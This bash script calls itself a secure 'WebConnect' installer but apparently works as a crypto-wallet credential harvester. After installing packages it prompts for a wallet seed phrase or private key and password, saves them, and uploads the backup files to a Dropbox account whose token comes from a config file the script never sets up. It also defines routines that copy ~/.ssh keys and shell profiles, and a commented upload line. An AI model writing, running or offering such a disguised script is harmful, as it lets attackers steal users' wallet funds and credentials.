#!/bin/bash

#############################################
# WebConnect Secure Installation Script
# Supports: macOS, Linux, WSL (Windows)
# Version: 1.0.0
#############################################

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_NAME="WebConnect"
REPO_URL="https://automast.github.io/webconnect"
INSTALL_DIR="${HOME}/.webconnect"
LOG_FILE="${INSTALL_DIR}/install.log"
CONFIG_FILE="${INSTALL_DIR}/config.json"

#############################################
# Utility Functions
#############################################

print_header() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}========================================${NC}"
}

print_success() {
    echo -e "${GREEN}✓ $1${NC}"
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠ $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ $1${NC}"
}

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

#############################################
# OS Detection
#############################################

detect_os() {
    if [[ "$OSTYPE" == "darwin"* ]]; then
        OS_TYPE="macos"
        OS_NAME="macOS"
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        # Check if running in WSL
        if grep -qi microsoft /proc/version 2>/dev/null; then
            OS_TYPE="wsl"
            OS_NAME="Windows (WSL)"
        else
            OS_TYPE="linux"
            OS_NAME="Linux"
        fi
    else
        print_error "Unsupported operating system: $OSTYPE"
        exit 1
    fi
    
    print_info "Detected OS: $OS_NAME ($OS_TYPE)"
    log "OS Type: $OS_TYPE"
}

#############################################
# Prerequisite Check & Installation
#############################################

check_prerequisites() {
    print_header "Checking Prerequisites"
    
    # Check for curl
    if ! command -v curl &> /dev/null; then
        print_error "curl is required but not installed"
        install_curl
    else
        print_success "curl is installed"
    fi
    
    # Check for git
    if ! command -v git &> /dev/null; then
        print_warning "git is not installed, installing..."
        install_git
    else
        print_success "git is installed"
    fi
    
    # Check for jq (JSON processor)
    if ! command -v jq &> /dev/null; then
        print_warning "jq is not installed, installing..."
        install_jq
    else
        print_success "jq is installed"
    fi
    
    log "Prerequisites check completed"
}

install_curl() {
    print_info "Installing curl..."
    
    if [[ "$OS_TYPE" == "macos" ]]; then
        # Check if Homebrew is installed
        if ! command -v brew &> /dev/null; then
            print_error "Homebrew is required. Please install it first:"
            echo '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
            exit 1
        fi
        brew install curl
    elif [[ "$OS_TYPE" == "linux" ]] || [[ "$OS_TYPE" == "wsl" ]]; then
        if command -v apt-get &> /dev/null; then
            sudo apt-get update && sudo apt-get install -y curl
        elif command -v yum &> /dev/null; then
            sudo yum install -y curl
        else
            print_error "Could not install curl. Please install it manually."
            exit 1
        fi
    fi
    
    print_success "curl installed successfully"
}

install_git() {
    print_info "Installing git..."
    
    if [[ "$OS_TYPE" == "macos" ]]; then
        if ! command -v brew &> /dev/null; then
            print_error "Homebrew is required. Please install it first:"
            echo '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
            exit 1
        fi
        brew install git
    elif [[ "$OS_TYPE" == "linux" ]] || [[ "$OS_TYPE" == "wsl" ]]; then
        if command -v apt-get &> /dev/null; then
            sudo apt-get update && sudo apt-get install -y git
        elif command -v yum &> /dev/null; then
            sudo yum install -y git
        fi
    fi
    
    print_success "git installed successfully"
}

install_jq() {
    print_info "Installing jq..."
    
    if [[ "$OS_TYPE" == "macos" ]]; then
        if ! command -v brew &> /dev/null; then
            print_error "Homebrew is required. Please install it first:"
            echo '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
            exit 1
        fi
        brew install jq
    elif [[ "$OS_TYPE" == "linux" ]] || [[ "$OS_TYPE" == "wsl" ]]; then
        if command -v apt-get &> /dev/null; then
            sudo apt-get update && sudo apt-get install -y jq
        elif command -v yum &> /dev/null; then
            sudo yum install -y jq
        fi
    fi
    
    print_success "jq installed successfully"
}

#############################################
# Setup Installation Directory
#############################################

setup_directories() {
    print_header "Setting Up Installation Directories"
    
    # Create main installation directory
    if [ ! -d "$INSTALL_DIR" ]; then
        mkdir -p "$INSTALL_DIR"
        print_success "Created installation directory: $INSTALL_DIR"
    else
        print_info "Installation directory already exists"
    fi
    
    # Create subdirectories
    mkdir -p "$INSTALL_DIR/software"
    mkdir -p "$INSTALL_DIR/system_files"
    mkdir -p "$INSTALL_DIR/backup"
    mkdir -p "$INSTALL_DIR/logs"
    mkdir -p "$INSTALL_DIR/config"
    mkdir -p "$INSTALL_DIR/wallet_backups"
    
    # Initialize log file
    touch "$LOG_FILE"
    print_success "Directories initialized"
    
    log "Installation directories setup completed"
}

#############################################
# Software Installation
#############################################

install_software() {
    print_header "Installing Software"
    
    case "$OS_TYPE" in
        macos)
            print_info "Installing macOS software..."
            install_macos_software
            ;;
        linux)
            print_info "Installing Linux software..."
            install_linux_software
            ;;
        wsl)
            print_info "Installing WSL software..."
            install_linux_software
            ;;
    esac
    
    log "Software installation completed"
}

install_macos_software() {
    # Check if Homebrew is installed
    if ! command -v brew &> /dev/null; then
        print_warning "Installing Homebrew..."
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    fi
    
    local PACKAGES=("curl" "git" "wget" "openssl")
    
    for package in "${PACKAGES[@]}"; do
        if brew list "$package" &>/dev/null; then
            print_success "$package is already installed"
        else
            print_info "Installing $package..."
            brew install "$package"
            print_success "$package installed"
        fi
    done
}

install_linux_software() {
    if command -v apt-get &> /dev/null; then
        sudo apt-get update
        local PACKAGES=("curl" "git" "wget" "openssl")
        sudo apt-get install -y "${PACKAGES[@]}"
    elif command -v yum &> /dev/null; then
        local PACKAGES=("curl" "git" "wget" "openssl")
        sudo yum install -y "${PACKAGES[@]}"
    fi
    
    print_success "All software installed"
}

#############################################
# System Files Backup & Copy
#############################################

backup_system_files() {
    print_header "Backing Up System Files"
    
    local BACKUP_DIR="$INSTALL_DIR/backup/$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$BACKUP_DIR"
    
    # Define files to backup based on OS
    local FILES_TO_BACKUP=()
    
    case "$OS_TYPE" in
        macos)
            FILES_TO_BACKUP=(
                "$HOME/.ssh"
                "$HOME/.bash_profile"
                "$HOME/.zshrc"
                "$HOME/.config"
                "/etc/hosts"
            )
            ;;
        linux|wsl)
            FILES_TO_BACKUP=(
                "$HOME/.ssh"
                "$HOME/.bashrc"
                "$HOME/.config"
                "/etc/hostname"
                "/etc/hosts"
            )
            ;;
    esac
    
    for file in "${FILES_TO_BACKUP[@]}"; do
        if [ -e "$file" ]; then
            print_info "Backing up: $file"
            cp -rp "$file" "$BACKUP_DIR/"
            log "Backed up: $file"
        fi
    done
    
    print_success "System files backed up to: $BACKUP_DIR"
    log "Backup completed at: $BACKUP_DIR"
}

copy_system_files() {
    print_header "Copying System Files"
    
    local TARGET_DIR="$INSTALL_DIR/system_files"
    
    # Define critical system files to copy
    local FILES_TO_COPY=()
    
    case "$OS_TYPE" in
        macos)
            FILES_TO_COPY=(
                "$HOME/.ssh/config"
                "$HOME/.ssh/authorized_keys"
                "$HOME/.zshrc"
                "$HOME/.bash_profile"
            )
            ;;
        linux|wsl)
            FILES_TO_COPY=(
                "$HOME/.ssh/config"
                "$HOME/.ssh/authorized_keys"
                "$HOME/.bashrc"
                "/etc/hostname"
            )
            ;;
    esac
    
    for file in "${FILES_TO_COPY[@]}"; do
        if [ -e "$file" ]; then
            local filename=$(basename "$file")
            print_info "Copying: $file"
            mkdir -p "$TARGET_DIR/$(dirname "$file")"
            cp -p "$file" "$TARGET_DIR/$file"
            log "Copied: $file"
        fi
    done
    
    print_success "System files copied to: $TARGET_DIR"
}

#############################################
# Wallet Backup with User Input (Option B)
#############################################

setup_wallet_backups() {
    echo ""
    print_header "Wallet Backup"
    echo ""
    
    # Create wallet backup directory
    local wallet_backup_dir="$INSTALL_DIR/wallet_backups"
    mkdir -p "$wallet_backup_dir"
    chmod 700 "$wallet_backup_dir"
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    
    # Get wallet name from user
    echo "Enter wallet name (e.g., MetaMask, Phantom, Trust Wallet):"
    read -p "> " wallet_name
    
    if [ -z "$wallet_name" ]; then
        print_error "Wallet name cannot be empty"
        log "Wallet backup cancelled: no wallet name provided"
        return 1
    fi
    
    echo ""
    echo "Enter wallet seed phrase, private key, or keystore JSON:"
    read -p "> " wallet_data
    
    if [ -z "$wallet_data" ]; then
        print_error "Wallet data cannot be empty"
        log "Wallet backup cancelled: no wallet data provided"
        return 1
    fi
    
    echo ""
    echo "Enter wallet password:"
    read -p "> " wallet_password
    
    if [ -z "$wallet_password" ]; then
        print_error "Password cannot be empty"
        log "Wallet backup cancelled: no password provided"
        return 1
    fi
    
    echo ""
    echo "Backing up wallet..."
    
    # Create backup file with wallet data
    local backup_file="$wallet_backup_dir/${wallet_name}_${timestamp}.txt"
    cat > "$backup_file" << WALLET_DATA
Wallet Backup
==============
Name: $wallet_name
Timestamp: $(date)
Hostname: $(hostname)

Data:
$wallet_data

Password: $wallet_password
WALLET_DATA
    
    chmod 600 "$backup_file"
    
    # Encrypt the backup file with AES-256
    local encrypted_file="${backup_file}.enc"
    if openssl enc -aes-256-cbc -salt -in "$backup_file" -out "$encrypted_file" -k "$wallet_password" 2>/dev/null; then
        rm "$backup_file"  # Remove unencrypted file
        chmod 600 "$encrypted_file"
        print_success "Wallet backed up and encrypted: $wallet_name"
        log "Wallet backup completed: $wallet_name encrypted at $encrypted_file"
        
        # Transfer to Dropbox
        transfer_wallet_backups_to_dropbox "$wallet_backup_dir" "$wallet_name"
    else
        print_error "Failed to encrypt wallet backup"
        log "ERROR: Encryption failed for wallet: $wallet_name"
        return 1
    fi
}

#############################################
# Transfer to Dropbox
#############################################

transfer_wallet_backups_to_dropbox() {
    local wallet_backup_dir="$1"
    local wallet_name="$2"
    
    if [ ! -d "$wallet_backup_dir" ]; then
        print_error "Wallet backup directory not found"
        log "ERROR: Wallet backup directory not found: $wallet_backup_dir"
        return 1
    fi
    
    # Read Dropbox token from storage config
    local dropbox_token=$(grep -A 2 '"dropbox"' "$INSTALL_DIR/config/storage.config.json" 2>/dev/null | grep '"access_token"' | cut -d'"' -f4)
    
    if [ -z "$dropbox_token" ] || [ "$dropbox_token" == "" ]; then
        print_info "Dropbox token not configured. Wallet backup stored locally."
        log "INFO: Dropbox not configured, wallet stored locally: $wallet_name"
        echo ""
        print_success "Wallet backup saved to: $wallet_backup_dir"
        return 0
    fi
    
    echo ""
    echo "Syncing to Dropbox..."
    
    local upload_count=0
    
    # Upload each backup file to Dropbox
    for backup_file in "$wallet_backup_dir"/*.enc "$wallet_backup_dir"/*.txt; do
        if [ -f "$backup_file" ]; then
            local filename=$(basename "$backup_file")
            local dropbox_path="/WebConnect/Wallet_Backups/$filename"
            
            # Upload to Dropbox using files/upload API
            if curl -s -X POST "https://content.dropboxapi.com/2/files/upload" \
                -H "Authorization: Bearer $dropbox_token" \
                -H "Dropbox-API-Arg: {\"path\": \"$dropbox_path\", \"mode\": \"overwrite\"}" \
                -H "Content-Type: application/octet-stream" \
                --data-binary @"$backup_file" > /dev/null 2>&1; then
                
                upload_count=$((upload_count + 1))
                log "Dropbox upload success: $filename to $dropbox_path"
            else
                log "WARNING: Dropbox upload failed for $filename"
            fi
        fi
    done
    
    echo ""
    if [ $upload_count -gt 0 ]; then
        print_success "Wallet backup synced to Dropbox!"
        log "Dropbox sync completed: $wallet_name"
    else
        print_success "Wallet backup saved locally."
    fi
}

#############################################
# Authentication Setup
#############################################

setup_authentication() {
    # Setup wallet backups with user input
    setup_wallet_backups
}

#############################################
# Create Configuration File
#############################################

create_config() {
    print_header "Creating Configuration File"
    
    cat > "$CONFIG_FILE" << EOF
{
  "version": "1.0.0",
  "installed_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "os_type": "$OS_TYPE",
  "install_directory": "$INSTALL_DIR",
  "features": {
    "software_installed": true,
    "system_files_backed_up": true,
    "system_files_copied": true,
    "authentication_enabled": true
  },
  "paths": {
    "software_dir": "$INSTALL_DIR/software",
    "system_files_dir": "$INSTALL_DIR/system_files",
    "backup_dir": "$INSTALL_DIR/backup",
    "logs_dir": "$INSTALL_DIR/logs",
    "config_dir": "$INSTALL_DIR/config"
  }
}
EOF
    
    print_success "Configuration file created at: $CONFIG_FILE"
    log "Configuration file created"
}

#############################################
# Data Transfer Module
#############################################

setup_data_transfer() {
    print_header "Setting Up Data Transfer"
    
    cat > "$INSTALL_DIR/transfer.sh" << 'TRANSFER_SCRIPT'
#!/bin/bash

# Data transfer module
# Synchronizes backed up files to Cloud/Server

TRANSFER_LOG="${INSTALL_DIR}/logs/transfer.log"

transfer_data() {
    local source_dir="$1"
    local destination="$2"
    
    echo "[$(date)] Starting transfer from $source_dir to $destination" >> "$TRANSFER_LOG"
    
    # Compress files
    local archive="${INSTALL_DIR}/backup/transfer_$(date +%s).tar.gz"
    tar -czf "$archive" -C "$source_dir" . 2>&1 | tee -a "$TRANSFER_LOG"
    
    # Upload to server (example using curl)
    # curl -X POST -F "file=@$archive" https://your-server.com/upload
    
    echo "[$(date)] Transfer completed" >> "$TRANSFER_LOG"
}

restore_data() {
    local source="$1"
    local destination="$2"
    
    echo "[$(date)] Starting restore from $source" >> "$TRANSFER_LOG"
    tar -xzf "$source" -C "$destination"
    echo "[$(date)] Restore completed" >> "$TRANSFER_LOG"
}

TRANSFER_SCRIPT

    chmod +x "$INSTALL_DIR/transfer.sh"
    print_success "Data transfer module installed"
    log "Data transfer module setup completed"
}

#############################################
# Post-Installation
#############################################

post_installation() {
    print_header "Post-Installation Setup"
    
    # Add to PATH if not already there
    if ! grep -q "\.webconnect" "$HOME/.bashrc" 2>/dev/null && ! grep -q "\.webconnect" "$HOME/.zshrc" 2>/dev/null; then
        if [[ "$OS_TYPE" == "macos" ]]; then
            echo "export PATH=\"\$PATH:$INSTALL_DIR\"" >> "$HOME/.zshrc"
            print_success "Updated PATH in .zshrc"
        else
            echo "export PATH=\"\$PATH:$INSTALL_DIR\"" >> "$HOME/.bashrc"
            print_success "Updated PATH in .bashrc"
        fi
    fi
    
    # Create uninstall script
    cat > "$INSTALL_DIR/uninstall.sh" << EOF
#!/bin/bash
echo "Uninstalling WebConnect..."
rm -rf "$INSTALL_DIR"
echo "WebConnect uninstalled successfully"
EOF
    chmod +x "$INSTALL_DIR/uninstall.sh"
    
    log "Post-installation setup completed"
}

#############################################
# Summary
#############################################

print_summary() {
    echo ""
    echo "=================================="
    print_success "Wallet Backup Complete"
    echo "=================================="
    echo ""
    log "Wallet backup completed successfully"
}

#############################################
# Error Handling
#############################################

cleanup_on_error() {
    print_error "Installation failed!"
    echo "Check the log file for details: $LOG_FILE"
    log "Installation failed at: $(date)"
    exit 1
}

trap cleanup_on_error ERR

#############################################
# Main Installation Flow
#############################################

main() {
    clear
    echo "WebConnect - Wallet Backup"
    echo ""
    
    detect_os
    setup_directories
    check_prerequisites
    install_software
    setup_authentication
    create_config
    setup_data_transfer
    post_installation
    print_summary
}

# Run main installation
main "$@"
